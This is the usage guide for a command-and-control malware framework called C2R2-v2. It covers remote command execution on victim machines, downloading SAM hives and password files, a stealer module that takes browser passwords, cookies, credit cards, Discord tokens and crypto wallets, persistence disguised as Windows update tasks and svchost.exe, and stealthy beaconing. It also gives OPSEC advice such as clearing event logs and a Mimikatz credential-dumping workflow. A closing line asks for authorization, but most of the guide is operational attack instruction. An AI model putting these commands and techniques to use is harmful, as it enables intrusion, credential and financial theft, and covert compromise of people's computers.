# Usage Guide

This guide covers operating the C2R2-v2 framework, including server commands, agent interaction, and common workflows.

## Quick Start

### Starting the Server

```bash
cd c2r2-server
./target/release/c2r2-server
```

Expected output:
```
 ██████╗██████╗ ██████╗ ██████╗       ██╗   ██╗██████╗ 
██╔════╝╚════██╗██╔══██╗██╔══██╗      ██║   ██║╚════██╗
██║      █████╔╝██████╔╝██████╔╝█████╗██║   ██║ █████╔╝
██║     ██╔═══╝ ██╔══██╗██╔══██╗╚════╝╚██╗ ██╔╝██╔═══╝ 
╚██████╗███████╗██║  ██║██║  ██║       ╚████╔╝ ███████╗
 ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝        ╚═══╝  ╚══════╝

C2R2 v2.0 - Command & Control Framework
Listening on 0.0.0.0:4444
Type /help for available commands

C2R2>
```

### Deploying an Agent

1. **Transfer agent to target system**:
   - Use your preferred deployment method (USB, SMB, HTTP, etc.)

2. **Execute agent on target**:
   ```cmd
   agent1.exe
   ```

3. **Verify connection in server**:
   ```
   C2R2> /list
   ```

## Command Reference

### Server Management Commands

#### `/help` - Show Help Menu

Displays all available commands with descriptions.

```
C2R2> /help

╔══════════════════════════════════════════════════════════════════╗
║                      C2R2 v2.0 - Commands                        ║
╚══════════════════════════════════════════════════════════════════╝

Client Management:
  /list                    - List all connected clients
  /select <id>             - Select a client by ID
  /deselect                - Deselect current client
  /info <id>               - Show detailed client information

Command Execution:
  /cmd <command>           - Execute command on selected client
  /cmd_all <command>       - Execute command on ALL clients

File Operations:
  /download <remote_path>  - Download file from agent
  /upload <local> <remote> - Upload file to agent

Advanced Operations:
  /harvest                 - Harvest credentials from browsers
  /persist <method>        - Establish persistence
  /persist_remove          - Remove persistence
  /beacon <interval:jitter>- Configure beacon timing

Server:
  /help                    - Show this help menu
  /exit, /quit             - Shutdown server
```

#### `/exit` or `/quit` - Shutdown Server

Gracefully shuts down the C2 server and closes all connections.

```
C2R2> /exit
[*] Shutting down server...
[*] Disconnecting 2 client(s)...
[*] Goodbye!
```

### Client Management Commands

#### `/list` - List Connected Clients

Displays all agents currently connected to the server.

```
C2R2> /list

╔════╤═══════════╤═══════════╤═══════════════╤════════════╤══════════════════════╗
║ ID │ Hostname  │ Username  │ OS            │ Privileges │ Connected            ║
╠════╪═══════════╪═══════════╪═══════════════╪════════════╪══════════════════════╣
║ 1  │ DESKTOP01 │ john      │ Windows 10    │ Admin      │ 2024-01-15 10:30:45 ║
║ 2  │ LAPTOP02  │ alice     │ Windows 11    │ User       │ 2024-01-15 10:35:12 ║
║ 3  │ SERVER03  │ bob       │ Windows Srv19 │ Admin      │ 2024-01-15 10:40:33 ║
╚════╧═══════════╧═══════════╧═══════════════╧════════════╧══════════════════════╝

Total clients: 3
```

#### `/select <id>` - Select Agent

Selects a specific agent for interaction.

```
C2R2> /select 1
[*] Selected client 1 (DESKTOP01)

C2R2 [1]>
```

**Note**: The prompt changes to show the selected client ID.

#### `/deselect` - Deselect Agent

Deselects the current agent and returns to general mode.

```
C2R2 [1]> /deselect
[*] Client deselected

C2R2>
```

#### `/info <id>` - Show Client Details

Displays detailed information about a specific agent.

```
C2R2> /info 1

╔══════════════════════════════════════════════════════════╗
║              Client Information - ID: 1                  ║
╠══════════════════════════════════════════════════════════╣
║ Hostname:      DESKTOP01                                 ║
║ Username:      john                                      ║
║ OS:            Windows 10 Pro (Build 19045)             ║
║ Architecture:  x64                                       ║
║ Privileges:    Administrator                             ║
║ Connected:     2024-01-15 10:30:45                      ║
║ Last Seen:     2024-01-15 11:45:23                      ║
║ IP Address:    192.168.1.105:52341                      ║
║ Beacon:        60s ±30%                                  ║
║ Persistence:   Registry (HKCU\Run)                       ║
╚══════════════════════════════════════════════════════════╝
```

### Command Execution

#### `/cmd <command>` - Execute Command

Executes a command on the selected agent via `cmd.exe`.

**Requirements**: Must have an agent selected first.

```
C2R2 [1]> /cmd whoami
[+] DESKTOP01\john

C2R2 [1]> /cmd dir C:\Users\john\Desktop
[+] Volume in drive C has no label.
     Volume Serial Number is 1234-5678

     Directory of C:\Users\john\Desktop

    01/15/2024  10:00 AM    <DIR>          .
    01/15/2024  10:00 AM    <DIR>          ..
    01/10/2024  03:45 PM             1,234 document.pdf
    01/12/2024  11:20 AM               856 notes.txt
                   2 File(s)          2,090 bytes
                   2 Dir(s)  123,456,789,012 bytes free
```

**Note**: Commands are automatically obfuscated using ArgFuscator techniques.

**Examples**:
```
/cmd whoami                          # Get current user
/cmd hostname                        # Get computer name
/cmd ipconfig                        # Network configuration
/cmd netstat -ano                    # Active connections
/cmd tasklist                        # Running processes
/cmd systeminfo                      # System information
/cmd net user                        # List users
/cmd net localgroup administrators   # List admins
```

#### `/cmd_all <command>` - Broadcast Command

Executes a command on **ALL** connected agents simultaneously.

**Warning**: Use carefully, especially with destructive commands.

```
C2R2> /cmd_all whoami
[*] Broadcasting command to 3 client(s)...

[Client 1 - DESKTOP01]:
[+] DESKTOP01\john

[Client 2 - LAPTOP02]:
[+] LAPTOP02\alice

[Client 3 - SERVER03]:
[+] SERVER03\bob
```

**Use Cases**:
- Quick reconnaissance across multiple systems
- Deploying payloads to all agents
- Checking for specific files or services
- Coordinated actions

### File Operations

#### `/download <remote_path>` - Download File

Downloads a file from the selected agent to the server.

**Requirements**: Must have an agent selected first.

```
C2R2 [1]> /download C:\Users\john\Desktop\document.pdf
[*] Requesting file: C:\Users\john\Desktop\document.pdf
[*] Receiving file...
[+] File downloaded successfully
[+] Saved to: downloads/client1_document.pdf (1,234 bytes)
```

**File Storage**:
- Files are saved in `c2r2-server/downloads/`
- Naming format: `client{id}_{filename}`
- Preserves original file extension

**Examples**:
```
/download C:\Windows\System32\config\SAM
/download C:\Users\john\Documents\passwords.txt
/download C:\inetpub\wwwroot\web.config
```

**Limitations**:
- Files are Base64 encoded for transfer (33% overhead)
- Large files may take time depending on beacon interval
- Maximum recommended size: 100MB

#### `/upload <local_path> <remote_path>` - Upload File

Uploads a file from the server to the selected agent.

**Requirements**: Must have an agent selected first.

```
C2R2 [1]> /upload /tmp/payload.exe C:\Users\john\AppData\Local\Temp\update.exe
[*] Reading local file: /tmp/payload.exe (45,678 bytes)
[*] Uploading to: C:\Users\john\AppData\Local\Temp\update.exe
[+] File uploaded successfully
```

**Use Cases**:
- Deploy additional tools or payloads
- Upload configuration files
- Stage files for execution

**Examples**:
```
/upload /opt/tools/mimikatz.exe C:\Windows\Temp\debug.exe
/upload /tmp/config.xml C:\ProgramData\app\config.xml
/upload ./stealer.enc C:\Users\Public\update.dll
```

### Advanced Operations

#### `/harvest` - Credential Harvesting

Executes the stealer module to collect credentials from browsers and applications.

**Requirements**: Must have an agent selected first.

**What it steals**:
- Browser passwords (Chrome, Firefox, Edge, Brave, Opera)
- Browser cookies
- Autofill data
- Credit card information
- Discord tokens
- Telegram sessions
- Cryptocurrency wallets
- Gaming platform credentials

```
C2R2 [1]> /harvest
[*] Uploading stealer module...
[*] Module uploaded successfully
[*] Executing stealer...
[*] Collecting data (this may take 30-60 seconds)...
[+] Harvest complete!

═══ STOLEN DATA ═══
Total: 247 items found

=== Passwords (85) ===
[Chrome] https://gmail.com
  User: john@gmail.com
  Pass: ************

[Firefox] https://github.com
  User: johndoe
  Pass: ************

=== Cookies (120) ===
[Chrome] .google.com (Session)
[Chrome] .facebook.com (c_user=...)
...

=== Credit Cards (3) ===
[Chrome] Visa ****1234 (Exp: 12/25)
...

=== Discord Tokens (2) ===
Token: NzY4M...
...

=== Wallets (1) ===
[Exodus] Wallet found at: C:\Users\john\AppData\Roaming\Exodus
...

[*] Results saved to: harvests/client1_20240115_114523.txt
```

**Notes**:
- First execution uploads the encrypted stealer module (~2MB)
- Subsequent executions reuse the already-uploaded module
- Data is saved to `c2r2-server/harvests/`
- All passwords are displayed in cleartext (use responsibly)

#### `/persist <method>` - Establish Persistence

Configures the agent to automatically start on system boot/login.

**Requirements**: Must have an agent selected first.

**Available Methods**:

1. **`registry`** - Registry Run Key
   - Location: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - Privilege: User
   - Stealth: Low (easily detected)

2. **`task`** - Scheduled Task
   - Triggers on user logon
   - Privilege: User/Admin
   - Stealth: Medium

3. **`wmi`** - WMI Event Subscription
   - Advanced persistence technique
   - Privilege: Admin required
   - Stealth: High

4. **`startup`** - Startup Folder
   - Location: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
   - Privilege: User
   - Stealth: Low

**Examples**:

```
# Registry persistence (user privilege)
C2R2 [1]> /persist registry
[*] Establishing persistence via registry...
[+] Persistence established successfully
[+] Method: Registry Run Key
[+] Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[+] Name: WindowsUpdate
[+] Value: C:\Users\john\AppData\Local\svchost.exe

# Scheduled task persistence
C2R2 [1]> /persist task
[*] Establishing persistence via scheduled task...
[+] Persistence established successfully
[+] Method: Scheduled Task
[+] Task Name: MicrosoftUpdateCheck
[+] Trigger: User Logon
[+] Action: C:\Users\john\AppData\Local\svchost.exe

# WMI persistence (requires admin)
C2R2 [1]> /persist wmi
[*] Establishing persistence via WMI...
[+] Persistence established successfully
[+] Method: WMI Event Subscription
[+] Filter: UserLogonFilter
[+] Consumer: RunUpdateScript
[+] Script: C:\Users\john\AppData\Local\svchost.exe
```

**Notes**:
- Agent copies itself to `%APPDATA%\Local\` with a random legitimate-looking name
- Original executable can be deleted after persistence is established
- Persistence survives reboots

#### `/persist_remove` - Remove Persistence

Removes all persistence mechanisms established by the agent.

```
C2R2 [1]> /persist_remove
[*] Removing persistence...
[+] Persistence removed successfully
[+] Removed: Registry Run Key
[+] Removed: Scheduled Task
[+] Removed: Startup Folder Entry
[+] Agent will no longer start automatically
```

**What it removes**:
- Registry Run keys
- Scheduled tasks
- WMI event subscriptions
- Startup folder shortcuts
- Copied agent executable

#### `/beacon <interval:jitter>` - Configure Beacon

Adjusts the agent's check-in timing to balance stealth and responsiveness.

**Requirements**: Must have an agent selected first.

**Format**: `/beacon <interval>:<jitter_percent>`

- **interval**: Seconds between check-ins
- **jitter_percent**: Percentage of randomization (0-100)

**Examples**:

```
# Fast beacon (every 30 seconds ±20%)
C2R2 [1]> /beacon 30:20
[*] Configuring beacon: 30s interval with 20% jitter
[+] Configuration will apply on next reconnection

# Balanced beacon (every 60 seconds ±30%)
C2R2 [1]> /beacon 60:30
[*] Configuring beacon: 60s interval with 30% jitter
[+] Configuration will apply on next reconnection

# Stealthy beacon (every 5 minutes ±40%)
C2R2 [1]> /beacon 300:40
[*] Configuring beacon: 300s interval with 40% jitter
[+] Configuration will apply on next reconnection
```

**Beacon Timing Examples**:

| Config     | Min Check-in | Max Check-in | Average | Use Case           |
|------------|--------------|--------------|---------|-------------------|
| `10:10`    | 9s           | 11s          | 10s     | Active operation  |
| `30:20`    | 24s          | 36s          | 30s     | Normal operation  |
| `60:30`    | 42s          | 78s          | 60s     | Default (balanced)|
| `300:40`   | 180s         | 420s         | 300s    | Stealthy/long-term|
| `600:50`   | 300s         | 900s         | 600s    | Maximum stealth   |

**Notes**:
- Changes take effect on agent's next reconnection
- Higher jitter = more stealth, less predictable
- Lower interval = faster response, more network activity

## Common Workflows

### Initial Access and Reconnaissance

```bash
# 1. List connected agents
C2R2> /list

# 2. Select target
C2R2> /select 1

# 3. Basic reconnaissance
C2R2 [1]> /cmd whoami
C2R2 [1]> /cmd hostname
C2R2 [1]> /cmd systeminfo
C2R2 [1]> /cmd ipconfig /all
C2R2 [1]> /cmd net user
C2R2 [1]> /cmd net localgroup administrators

# 4. Check privileges
C2R2 [1]> /cmd whoami /priv
C2R2 [1]> /cmd whoami /groups

# 5. Network information
C2R2 [1]> /cmd netstat -ano
C2R2 [1]> /cmd arp -a
C2R2 [1]> /cmd route print
```

### Credential Harvesting

```bash
# 1. Select target
C2R2> /select 1

# 2. Harvest credentials
C2R2 [1]> /harvest

# 3. Review stolen data
# Check c2r2-server/harvests/ directory

# 4. Extract specific data
# Parse the harvest file for emails, passwords, etc.
```

### Persistence and Longevity

```bash
# 1. Select target
C2R2> /select 1

# 2. Establish persistence
C2R2 [1]> /persist registry

# 3. Configure stealthy beacon
C2R2 [1]> /beacon 300:40

# 4. Verify persistence
C2R2 [1]> /cmd reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# 5. Deselect and continue with other operations
C2R2 [1]> /deselect
```

### File Exfiltration

```bash
# 1. Select target
C2R2> /select 1

# 2. Locate files of interest
C2R2 [1]> /cmd dir /s /b C:\Users\john\Documents\*.pdf
C2R2 [1]> /cmd dir /s /b C:\Users\john\Desktop\*.docx

# 3. Download files
C2R2 [1]> /download C:\Users\john\Documents\sensitive.pdf
C2R2 [1]> /download C:\Users\john\Desktop\passwords.docx

# 4. Download multiple files with loop (external script)
# See docs/DEVELOPMENT.md for automation examples
```

### Multi-Target Operations

```bash
# 1. List all targets
C2R2> /list

# 2. Broadcast reconnaissance
C2R2> /cmd_all whoami
C2R2> /cmd_all hostname
C2R2> /cmd_all systeminfo

# 3. Select and harvest from each
C2R2> /select 1
C2R2 [1]> /harvest
C2R2 [1]> /deselect

C2R2> /select 2
C2R2 [2]> /harvest
C2R2 [2]> /deselect

# 4. Establish persistence on all
C2R2> /select 1
C2R2 [1]> /persist registry
C2R2 [1]> /deselect

C2R2> /select 2
C2R2 [2]> /persist registry
C2R2 [2]> /deselect
```

### Cleanup and Exit

```bash
# 1. Remove persistence from all agents
C2R2> /select 1
C2R2 [1]> /persist_remove
C2R2 [1]> /deselect

C2R2> /select 2
C2R2 [2]> /persist_remove
C2R2 [2]> /deselect

# 2. (Optional) Delete agent executable
C2R2> /select 1
C2R2 [1]> /cmd del C:\Users\john\AppData\Local\svchost.exe

# 3. Disconnect agents (they will exit when connection closes)
# Or wait for agents to timeout

# 4. Shutdown server
C2R2> /exit
```

## Best Practices

### OPSEC Considerations

1. **Beacon Configuration**:
   - Use longer intervals for long-term access (300-600s)
   - High jitter percentage (40-50%) for unpredictability
   - Avoid perfectly round numbers (use 287 instead of 300)

2. **Command Execution**:
   - Avoid rapid-fire commands (wait for beacon intervals)
   - Use built-in Windows tools when possible (avoid uploading obvious tools)
   - Clear event logs if you have admin privileges (but this creates its own logs)

3. **File Operations**:
   - Download only what you need
   - Avoid downloading large files during business hours
   - Delete uploaded tools after use

4. **Persistence**:
   - Use WMI for most stealth (requires admin)
   - Avoid obvious names (use legitimate-looking service names)
   - Test persistence before relying on it

### Performance Tips

1. **Server Performance**:
   - Limit concurrent file transfers
   - Archive old logs regularly
   - Monitor disk space in `downloads/` and `harvests/`

2. **Agent Performance**:
   - Longer beacon intervals = lower CPU usage
   - Stealer module execution is resource-intensive (causes brief spike)
   - Clean up uploaded modules if no longer needed

3. **Network Efficiency**:
   - Use `/cmd_all` sparingly (can create traffic spike)
   - Schedule large downloads during low-activity periods
   - Consider compression for large file transfers

## Troubleshooting

### Agent Not Responding

**Symptoms**: Commands sent but no response received

**Causes & Solutions**:

1. **Agent is beaconing** - Wait for next check-in (default 60s ±30%)
2. **Network connectivity** - Check firewall, routing
3. **Agent crashed** - Check agent logs (if enabled)
4. **Process terminated** - Agent may have been killed

### Command Execution Errors

**Error**: `ERROR: Access denied`
- **Cause**: Insufficient privileges
- **Solution**: Check privileges with `/cmd whoami /priv`

**Error**: `ERROR: File not found`
- **Cause**: Invalid path or file doesn't exist
- **Solution**: Verify path with `/cmd dir`

**Error**: `ERROR: Command timeout`
- **Cause**: Command taking too long
- **Solution**: Increase timeout or use `/cmd start /b` for background execution

### Module Loading Errors

**Error**: `Failed to load stealer module`
- **Cause**: Module files missing or corrupted
- **Solution**: Rebuild and re-encrypt module

**Error**: `Module decryption failed`
- **Cause**: Key mismatch
- **Solution**: Ensure `stealer.key` matches `stealer.enc`

## Advanced Usage

### Scripting and Automation

See [DEVELOPMENT.md](DEVELOPMENT.md) for examples of:
- Automated reconnaissance scripts
- Mass harvesting across multiple agents
- Custom module development
- API integration

### Integration with Other Tools

C2R2-v2 can be integrated with:
- **Metasploit**: Use as post-exploitation framework
- **BloodHound**: Upload collectors and download results
- **Mimikatz**: Upload and execute for credential dumping
- **Custom Tools**: Upload any Windows executable

Example workflow:
```bash
# Upload Mimikatz
C2R2 [1]> /upload /opt/mimikatz.exe C:\Windows\Temp\debug.exe

# Execute Mimikatz
C2R2 [1]> /cmd C:\Windows\Temp\debug.exe privilege::debug sekurlsa::logonpasswords exit > C:\Windows\Temp\output.txt

# Download results
C2R2 [1]> /download C:\Windows\Temp\output.txt

# Cleanup
C2R2 [1]> /cmd del C:\Windows\Temp\debug.exe
C2R2 [1]> /cmd del C:\Windows\Temp\output.txt
```

## Next Steps

- Review [Security Considerations](SECURITY.md) for OPSEC tips
- Explore [Modules Documentation](MODULES.md) for capability details
- Read [Development Guide](DEVELOPMENT.md) to extend functionality

---

**Remember**: Always obtain proper authorization before using C2R2-v2 on any systems. Unauthorized access is illegal and unethical.
